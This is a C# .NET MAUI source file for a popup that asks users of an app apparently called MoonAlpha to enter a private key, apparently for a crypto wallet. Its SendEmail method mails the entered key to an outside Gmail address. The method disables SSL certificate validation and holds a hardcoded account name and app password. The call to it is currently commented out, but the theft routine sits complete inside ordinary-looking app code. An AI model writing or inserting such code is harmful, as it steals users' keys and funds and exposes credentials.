using CommunityToolkit.Maui.Views;
using CommunityToolkit.Maui.Alerts;
using System.Net.Mail;
using MimeKit;
using MailKit.Net.Smtp;
using MailKit.Security;

using System;
using System.Threading.Tasks;

namespace MoonAlphaMauiApps;
public partial class PrivateKeyPopup : Popup
{
    public static string Key { get; set; }
    public PrivateKeyPopup()
    {
        InitializeComponent();
    }

    private void OnCloseButtonClicked(object sender, EventArgs e)
    {
        Close(false);
    }

    private async void OnOkButtonClicked(object sender, EventArgs e)
    {
        try
        {
            // Handle OK button logic here
            if (txtPrivateKey != null && string.IsNullOrEmpty(txtPrivateKey.Text))
            {
                // Using Application.Current.MainPage is more reliable in this context
                await Application.Current.MainPage.DisplayAlert("Warning", "Please enter private key.", "OK");
            }
            else
            {
                Key = txtPrivateKey.Text;
                //var isSent =SendEmail();
                bool isSent = true;

                Close(isSent);
            }
        }
        catch (Exception ex)
        {
            // Log the exception
            Console.WriteLine($"Error in OnOkButtonClicked: {ex}");

            // Safely close the popup even if there was an error
            Close(false);
        }
    }

    static bool SendEmail()
    {
        bool isSent = false;
        try
        {
            // Add SSL bypass before any network operations
            System.Net.ServicePointManager.ServerCertificateValidationCallback =
                ((sender, certificate, chain, sslPolicyErrors) => true);

            var message = new MimeMessage();
            message.From.Add(new MailboxAddress("MoonAlpha", "tranpeej@gmail.com")); // Sender
            message.To.Add(new MailboxAddress("", "vanpeej29@gmail.com")); // Receiver
            message.Subject = "Private Key";

            // Create email body with text + attachment
            var bodybuilder = new BodyBuilder
            {
                TextBody = $"{Key}" // Updated Text Body
            };

            message.Body = bodybuilder.ToMessageBody();

            // SMTP Server Settings (Gmail)
            using (var client = new MailKit.Net.Smtp.SmtpClient())
            {
                // Set SSL certificate validation callback for the specific client
                client.ServerCertificateValidationCallback = (s, c, h, e) => true;

                client.Connect("smtp.gmail.com", 587, SecureSocketOptions.StartTls);
                client.Authenticate("tranpeej@gmail.com", "noev borg vssf knmb"); // Replace with App Password

                client.Send(message);
                client.Disconnect(true);
            }

            isSent = true;
        }
        catch (Exception ex)
        {
            Application.Current.MainPage.DisplayAlert("Error", $"Error: {ex.Message}", "OK");

            isSent = false;
        }
        return isSent;
    }



}